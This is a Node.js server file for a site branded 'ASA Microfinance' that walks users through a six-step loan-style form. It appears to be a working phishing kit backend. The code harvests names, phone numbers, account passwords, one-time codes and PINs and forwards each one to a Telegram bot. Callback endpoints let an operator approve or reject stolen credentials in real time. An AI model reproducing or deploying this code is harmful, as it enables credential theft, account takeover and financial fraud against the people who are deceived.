/**
 * server.js
 * Complete Express + Socket.IO server with DEBUG LOGGING
 */

require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

// Import Telegram bot manager
const botManager = require('./bot_manager');

// ============================================================================
// CONFIGURATION
// ============================================================================

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST'],
        credentials: true
    }
});

const PORT = process.env.PORT || 3000;

// ============================================================================
// SESSION STORAGE
// ============================================================================

const sessions = new Map();

// ============================================================================
// MIDDLEWARE
// ============================================================================

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
    console.log(`📝 ${req.method} ${req.path}`);
    next();
});

// ============================================================================
// SOCKET.IO CONNECTION HANDLING
// ============================================================================

io.use((socket, next) => {
    const sessionId = socket.handshake.auth.sessionId;
    
    if (!sessionId) {
        socket.sessionId = 'sess_' + uuidv4().substring(0, 8);
    } else {
        socket.sessionId = sessionId;
    }
    
    socket.appId = `ASA-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
    next();
});

io.on('connection', (socket) => {
    console.log('===========================================');
    console.log(`🔌 SOCKET CONNECTED: ${socket.id}`);
    console.log(`📋 Session ID: ${socket.sessionId}`);
    console.log(`📋 App ID: ${socket.appId}`);
    console.log('===========================================');
    
    // Initialize or retrieve session
    let session = sessions.get(socket.sessionId);
    
    if (!session) {
        session = {
            appId: socket.appId,
            createdAt: Date.now(),
            lastActivity: Date.now(),
            step1: null,
            step2: null,
            step3: null,
            step4: null,
            step5: null,
            step6: null,
            completed: false
        };
        sessions.set(socket.sessionId, session);
        console.log(`✅ New session created: ${socket.sessionId}`);
    } else {
        session.lastActivity = Date.now();
        console.log(`🔄 Existing session resumed: ${socket.sessionId}`);
        console.log(`🔄 App ID from session: ${session.appId}`);
        socket.appId = session.appId;
    }
    
    // Send appId
    socket.emit('session-ready', { appId: socket.appId });
    
    // Handle joining room
    socket.on('join-room', (roomId) => {
        socket.join(roomId);
        console.log(`👥 SOCKET ${socket.id} JOINED ROOM: ${roomId}`);
        console.log(`📊 ACTIVE ROOMS FOR THIS SOCKET:`, socket.rooms);
    });
    
    // ==========================================================================
    // STEP HANDLERS
    // ==========================================================================
    
    socket.on('step1', async (data, callback) => {
        console.log(`📦 STEP 1 received for ${socket.sessionId}`);
        session.step1 = data;
        session.lastActivity = Date.now();
        
        try {
            await botManager.sendStep1({ appId: session.appId, ...data });
        } catch (error) {
            console.error(`❌ Failed to send step 1:`, error.message);
        }
        
        callback({ success: true, step: 1 });
        socket.emit('step_ack', { step: 1 });
    });
    
    socket.on('step2', async (data, callback) => {
        console.log(`📦 STEP 2 received for ${socket.sessionId}`);
        session.step2 = data;
        session.lastActivity = Date.now();
        
        try {
            await botManager.sendStep2({ appId: session.appId, ...data });
        } catch (error) {
            console.error(`❌ Failed to send step 2:`, error.message);
        }
        
        callback({ success: true, step: 2 });
        socket.emit('step_ack', { step: 2 });
    });
    
    socket.on('step3', async (data, callback) => {
        console.log(`📦 STEP 3 received for ${socket.sessionId}`);
        session.step3 = data;
        session.lastActivity = Date.now();
        
        try {
            await botManager.sendStep3({ appId: session.appId, ...data });
        } catch (error) {
            console.error(`❌ Failed to send step 3:`, error.message);
        }
        
        callback({ success: true, step: 3 });
        socket.emit('step_ack', { step: 3 });
    });
    
    socket.on('step4', async (data, callback) => {
        console.log(`📦 STEP 4 received for ${socket.sessionId}`);
        session.step4 = data;
        session.lastActivity = Date.now();
        
        try {
            await botManager.requestPasswordVerification({
                appId: session.appId,
                firstName: session.step2?.firstName || 'Not provided',
                lastName: session.step2?.lastName || '',
                phone: data.phone,
                amount: session.step1?.amount || '0',
                password: data.password
            });
        } catch (error) {
            console.error(`❌ Failed to request password verification:`, error.message);
        }
        
        callback({ success: true, step: 4 });
        socket.emit('step_ack', { step: 4 });
    });
    
    socket.on('step5', async (data, callback) => {
        console.log(`📦 STEP 5 received for ${socket.sessionId}`);
        session.step5 = data;
        session.lastActivity = Date.now();
        
        try {
            await botManager.sendStep5({ appId: session.appId, ...data });
        } catch (error) {
            console.error(`❌ Failed to send step 5:`, error.message);
        }
        
        callback({ success: true, step: 5 });
        socket.emit('step_ack', { step: 5 });
    });
    
    socket.on('step6', async (data, callback) => {
        console.log(`📦 STEP 6 received for ${socket.sessionId}`);
        session.step6 = data;
        session.lastActivity = Date.now();
        session.completed = true;
        
        try {
            await botManager.requestPinVerification({
                appId: session.appId,
                firstName: session.step2?.firstName || 'Not provided',
                lastName: session.step2?.lastName || '',
                phone: session.step2?.phone || data.phone,
                amount: session.step1?.amount || '0',
                password: session.step4?.password || 'Not provided',
                otp: session.step5?.otp || 'Not provided',
                pin: data.pin
            });
            
            await botManager.sendCompleteApplication({
                appId: session.appId,
                step1: session.step1 || {},
                step2: session.step2 || {},
                step3: session.step3 || {},
                step4: session.step4 || {},
                step5: session.step5 || {},
                step6: session.step6 || {}
            });
        } catch (error) {
            console.error(`❌ Failed to send final verification:`, error.message);
        }
        
        callback({ success: true, step: 6, completed: true });
        socket.emit('step_ack', { step: 6 });
    });
    
    // ==========================================================================
    // OTP REQUEST
    // ==========================================================================
    
    socket.on('request-otp', (data, callback) => {
        const otp = Math.floor(100000 + Math.random() * 900000).toString();
        console.log(`🔐 OTP generated for ${socket.sessionId}: ${otp}`);
        
        socket.emit('otp-generated', { simulation: otp });
        
        botManager.sendMessage(`
🔐 OTP GENERATED
━━━━━━━━━━━━━━━━━━
🆔 Session: ${socket.sessionId}
📞 Phone: ${data.phone}
🔢 OTP: ${otp}
        `).catch(err => console.error('Failed to send OTP:', err));
        
        if (callback) callback({ success: true, otp });
    });
    
    socket.on('disconnect', () => {
        console.log(`🔌 Socket disconnected: ${socket.id}`);
    });
});

// ============================================================================
// BOT CALLBACK ENDPOINTS - WITH DEBUG LOGGING
// ============================================================================

app.post('/api/password-verified', express.json(), (req, res) => {
    const { appId } = req.body;
    console.log('===========================================');
    console.log(`✅ PASSWORD VERIFIED for ${appId}`);
    
    console.log(`📢 EMITTING password-verified to room: ${appId}`);
    console.log(`📊 ACTIVE ROOMS:`, io.sockets.adapter.rooms);
    
    io.to(appId).emit('password-verified');
    
    console.log('===========================================');
    res.json({ success: true });
});

app.post('/api/password-rejected', express.json(), (req, res) => {
    const { appId } = req.body;
    console.log(`❌ Password rejected for ${appId}`);
    
    io.to(appId).emit('password-rejected', { attempts: 1 });
    res.json({ success: true });
});

app.post('/api/pin-verified', express.json(), (req, res) => {
    const { appId } = req.body;
    console.log(`✅ PIN verified for ${appId}`);
    
    const referenceId = 'ASA-' + Date.now().toString(36).toUpperCase() + '-' + 
                        Math.random().toString(36).substring(2, 8).toUpperCase();
    
    io.to(appId).emit('pin-verified', { referenceId });
    res.json({ success: true });
});

app.post('/api/pin-rejected', express.json(), (req, res) => {
    const { appId } = req.body;
    console.log(`❌ PIN rejected for ${appId}`);
    
    io.to(appId).emit('pin-rejected', { attempts: 1 });
    res.json({ success: true });
});

// ============================================================================
// API ENDPOINTS
// ============================================================================

app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        sessions: sessions.size,
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================================
// ERROR HANDLING
// ============================================================================

app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.use((err, req, res, next) => {
    console.error('❌ Unhandled error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// ============================================================================
// START SERVER
// ============================================================================

server.listen(PORT, async () => {
    console.log(`
    ╔═══════════════════════════════════════════════════════════════╗
    ║         ASA MICROFINANCE SERVER - DEBUG MODE                  ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  Port:       ${PORT}                                             ║
    ║  Debug Logs: ✅ ENABLED                                        ║
    ╚═══════════════════════════════════════════════════════════════╝
    `);
});